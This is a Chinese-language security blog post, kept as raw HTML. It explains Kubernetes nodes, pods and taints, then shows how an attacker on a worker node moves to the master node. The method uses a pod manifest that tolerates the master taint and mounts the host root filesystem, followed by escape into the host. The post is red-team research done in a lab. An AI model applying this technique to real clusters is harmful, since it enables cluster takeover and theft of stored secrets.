<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Kubernetes(K8s)横向移动办法 - 倾旋的博客</title><meta name=theme-color><meta name=description content="
博客半年没写了，来除除草&mldr;. :(
0x01 Kubernetes 简介
Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。

传统部署时代：
早期，各个组织机构在物理服务器上运行应用程序。无法为物理服务器中的应用程序定义资源边界，这会导致资源分配问题。 例如，如果在物理服务器上运行多个应用程序，则可能会出现一个应用程序占用大部分资源的情况， 结果可能导致其他应用程序的性能下降。 一种解决方案是在不同的物理服务器上运行每个应用程序，但是由于资源利用不足而无法扩展， 并且维护许多物理服务器的成本很高。
虚拟化部署时代：
作为解决方案，引入了虚拟化。虚拟化技术允许你在单个物理服务器的 CPU 上运行多个虚拟机（VM）。 虚拟化允许应用程序在 VM 之间隔离，并提供一定程度的安全，因为一个应用程序的信息 不能被另一应用程序随意访问。
虚拟化技术能够更好地利用物理服务器上的资源，并且因为可轻松地添加或更新应用程序 而可以实现更好的可伸缩性，降低硬件成本等等。
每个 VM 是一台完整的计算机，在虚拟化硬件之上运行所有组件，包括其自己的操作系统。
容器部署时代：
容器类似于 VM，但是它们具有被放宽的隔离属性，可以在应用程序之间共享操作系统（OS）。 因此，容器被认为是轻量级的。容器与 VM 类似，具有自己的文件系统、CPU、内存、进程空间等。 由于它们与基础架构分离，因此可以跨云和 OS 发行版本进行移植。

以上摘自Kubernetes官方文档：https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/
0x02 Kubernetes 关键概念介绍
Kubernetes有如下几个与本文相关的概念：

节点(Node)
Pod
容忍度(Toleration)与污点(Taint)

节点(Node)
Kubernetes 通过将容器放入在节点（Node）上运行的 Pod 中来执行你的工作负载。 节点可以是一个虚拟机或者物理机器，取决于所在的集群配置。最容易理解的例子：

该集群有三个节点，我可以在这三个节点上创建很多个Pod，而Pod中可以包含多个容器。在所有的节点中，至少要有一个Master节点，Master节点是第一个加入集群的机器，它具有整个集群的最高权限，本文的目的就是研究如何通过其他节点，横向移动到Master节点，因为Secret敏感信息(令牌、账户密码、公私钥等等)都存储在Kubernetes的etcd数据库上。
Pod
Pod是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。
Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个） 容器； 这些容器共享存储、网络、以及怎样运行这些容器的声明。 Pod中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。 Pod所建模的是特定于应用的“逻辑主机”，其中包含一个或多个应用容器， 这些容器是相对紧密的耦合在一起的。 在非云环境中，在相同的物理机或虚拟机上运行的应用类似于 在同一逻辑主机上运行的云应用。
Pod的共享上下文包括一组 Linux 名字空间、控制组（cgroup）和可能一些其他的隔离方面，即用来隔离Docker容器的技术。 在Pod的上下文中，每个独立的应用可能会进一步实施隔离。"><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.150.0"><meta itemprop=name content="Kubernetes(K8s)横向移动办法"><meta itemprop=description content="Kubernetes (通常称为 K8s) 是来自 Google 云平台的开源容器集群管理系统，用于自动部署、扩展和管理容器化（containerized）应用程序。本文介绍获取了其中某个节点的宿主机权限，如何横向移动到Master节点，从而获取整个集群的权限。"><meta itemprop=datePublished content="2021-07-20T00:00:00+00:00"><meta itemprop=dateModified content="2021-07-20T00:00:00+00:00"><meta itemprop=wordCount content="149"><meta property="og:url" content="https://payloads.online/archivers/2021-07-20/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="Kubernetes(K8s)横向移动办法"><meta property="og:description" content="Kubernetes (通常称为 K8s) 是来自 Google 云平台的开源容器集群管理系统，用于自动部署、扩展和管理容器化（containerized）应用程序。本文介绍获取了其中某个节点的宿主机权限，如何横向移动到Master节点，从而获取整个集群的权限。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-20T00:00:00+00:00"><meta property="article:modified_time" content="2021-07-20T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Kubernetes(K8s)横向移动办法"><meta name=twitter:description content="Kubernetes (通常称为 K8s) 是来自 Google 云平台的开源容器集群管理系统，用于自动部署、扩展和管理容器化（containerized）应用程序。本文介绍获取了其中某个节点的宿主机权限，如何横向移动到Master节点，从而获取整个集群的权限。"><link rel=canonical href=https://payloads.online/archivers/2021-07-20/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">Kubernetes(K8s)横向移动办法</h1><div class="text-xs antialiased opacity-60"><time>Jul 20, 2021</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><blockquote><p>博客半年没写了，来除除草&mldr;. :(</p></blockquote><h2 id=0x01-kubernetes-简介>0x01 Kubernetes 简介</h2><p>Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。</p><p><img src=https://images.payloads.online/b3682bc6-4f5f-11ec-a3a0-00d861bf4abb.png alt=2021-07-20-11-19-39></p><p><strong>传统部署时代：</strong></p><p>早期，各个组织机构在物理服务器上运行应用程序。无法为物理服务器中的应用程序定义资源边界，这会导致资源分配问题。 例如，如果在物理服务器上运行多个应用程序，则可能会出现一个应用程序占用大部分资源的情况， 结果可能导致其他应用程序的性能下降。 一种解决方案是在不同的物理服务器上运行每个应用程序，但是由于资源利用不足而无法扩展， 并且维护许多物理服务器的成本很高。</p><p><strong>虚拟化部署时代：</strong></p><p>作为解决方案，引入了虚拟化。虚拟化技术允许你在单个物理服务器的 CPU 上运行多个虚拟机（VM）。 虚拟化允许应用程序在 VM 之间隔离，并提供一定程度的安全，因为一个应用程序的信息 不能被另一应用程序随意访问。</p><p>虚拟化技术能够更好地利用物理服务器上的资源，并且因为可轻松地添加或更新应用程序 而可以实现更好的可伸缩性，降低硬件成本等等。</p><p>每个 VM 是一台完整的计算机，在虚拟化硬件之上运行所有组件，包括其自己的操作系统。</p><p><strong>容器部署时代：</strong></p><p>容器类似于 VM，但是它们具有被放宽的隔离属性，可以在应用程序之间共享操作系统（OS）。 因此，容器被认为是轻量级的。容器与 VM 类似，具有自己的文件系统、CPU、内存、进程空间等。 由于它们与基础架构分离，因此可以跨云和 OS 发行版本进行移植。</p><blockquote><p>以上摘自Kubernetes官方文档：https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/</p></blockquote><h2 id=0x02-kubernetes-关键概念介绍>0x02 Kubernetes 关键概念介绍</h2><p>Kubernetes有如下几个与本文相关的概念：</p><ol><li>节点(Node)</li><li>Pod</li><li>容忍度(Toleration)与污点(Taint)</li></ol><h3 id=节点node>节点(Node)</h3><p>Kubernetes 通过将容器放入在节点（Node）上运行的 Pod 中来执行你的工作负载。 节点可以是一个虚拟机或者物理机器，取决于所在的集群配置。最容易理解的例子：</p><p><img src=https://images.payloads.online/b3b30a38-4f5f-11ec-8073-00d861bf4abb.png alt=2021-07-20-10-38-26></p><p>该集群有三个节点，我可以在这三个节点上创建很多个Pod，而Pod中可以包含多个容器。在所有的节点中，至少要有一个Master节点，Master节点是第一个加入集群的机器，它具有整个集群的最高权限，本文的目的就是研究如何通过其他节点，横向移动到Master节点，因为Secret敏感信息(令牌、账户密码、公私钥等等)都存储在Kubernetes的etcd数据库上。</p><h3 id=pod>Pod</h3><p>Pod是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。</p><p>Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个） 容器； 这些容器共享存储、网络、以及怎样运行这些容器的声明。 Pod中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。 Pod所建模的是特定于应用的“逻辑主机”，其中包含一个或多个应用容器， 这些容器是相对紧密的耦合在一起的。 在非云环境中，在相同的物理机或虚拟机上运行的应用类似于 在同一逻辑主机上运行的云应用。</p><p>Pod的共享上下文包括一组 Linux 名字空间、控制组（cgroup）和可能一些其他的隔离方面，即用来隔离Docker容器的技术。 在Pod的上下文中，每个独立的应用可能会进一步实施隔离。</p><p>就Docker概念的术语而言，Pod类似于共享名字空间和文件系统卷的一组Docker容器，也就是说Pod是Docker容器的超集。</p><h3 id=容忍度toleration与污点taint>容忍度(Toleration)与污点(Taint)</h3><p>Kubernetes可以约束一个 Pod 只能在特定的节点上运行。</p><p>节点亲和性 是Pod的一种属性，它使 Pod 被吸引到一类特定的节点 （这可能出于一种偏好，也可能是硬性要求）。 污点（Taint）则相反——它使节点能够排斥一类特定的 Pod。容忍度（Toleration）是应用于 Pod 上的，允许（但并不要求）Pod 调度到带有与之匹配的污点的节点上。<strong>我们可以控制Pod创建时候的污点来向集群内的节点进行喷射创建。</strong></p><h2 id=0x03-环境介绍>0x03 环境介绍</h2><p>当前实验环境有三个节点，其中一个为Master节点，其余的都是普通节点。</p><p><img src=https://images.payloads.online/b3ef7cfc-4f5f-11ec-984e-00d861bf4abb.png alt=2021-07-20-10-56-11></p><p>当前机器是node1，普通节点，节点全部为健康状态，接下来要利用创建Pod的功能，横向到k8s-master。</p><h2 id=0x04-利用创建pod横向移动>0x04 利用创建Pod横向移动</h2><ol><li>确认Master节点的容忍度</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ kubectl describe node &lt;Node Name&gt;
</span></span></code></pre></div><p><img src=https://images.payloads.online/b454933a-4f5f-11ec-a431-00d861bf4abb.png alt=2021-07-20-10-59-50></p><ol start=2><li>创建带有容忍参数的Pod</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ kubectl create -f control-master.yaml
</span></span></code></pre></div><p>control-master.yaml内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>v1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Pod</span>
</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>control-master-3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>tolerations</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>key</span>: <span style=color:#ae81ff>node-role.kubernetes.io/master</span>
</span></span><span style=display:flex><span><span style=color:#f92672>operator</span>: <span style=color:#ae81ff>Exists</span>
</span></span><span style=display:flex><span><span style=color:#f92672>effect</span>: <span style=color:#ae81ff>NoSchedule</span>
</span></span><span style=display:flex><span><span style=color:#f92672>containers</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>control-master-3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>image</span>: <span style=color:#ae81ff>ubuntu:18.04</span>
</span></span><span style=display:flex><span><span style=color:#f92672>command</span>: [<span style=color:#e6db74>&#34;/bin/sleep&#34;</span>, <span style=color:#e6db74>&#34;3650d&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#f92672>volumeMounts</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span><span style=color:#f92672>mountPath</span>: <span style=color:#ae81ff>/master</span>
</span></span><span style=display:flex><span><span style=color:#f92672>volumes</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>name</span>: <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span><span style=color:#f92672>hostPath</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>path</span>: <span style=color:#ae81ff>/</span>
</span></span><span style=display:flex><span><span style=color:#f92672>type</span>: <span style=color:#ae81ff>Directory</span>
</span></span></code></pre></div><p><img src=https://images.payloads.online/b4bba0de-4f5f-11ec-b260-00d861bf4abb.png alt=2021-07-20-11-02-18></p><p>在多次创建Pod后，会发现Pod会在Master节点上出现，再利用kubectl进入容器，执行逃逸。</p><p><img src=https://images.payloads.online/b5136788-4f5f-11ec-9315-00d861bf4abb.png alt=2021-07-20-11-06-24></p><p>至此，逃逸完成，能够通过写公私钥的方式控制Master宿主机。</p><h2 id=0x05-总结>0x05 总结</h2><p>本文通过了解Kubernetes的一些基本概念，完成了在节点中进行横向逃逸，但我没有实现指定节点的逃逸过程，因为在Kubernetes中低权限的节点无法修改Master节点的容忍度，因此要完成逃逸，需要在每一个节点上至少创建一个Pod，如果集群中节点数量庞大的话&mldr;.</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2021-08-11/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>Windows活动目录中的LDAP</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2021-02-16/1/><span>红队技巧：基于反向代理的水坑攻击</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>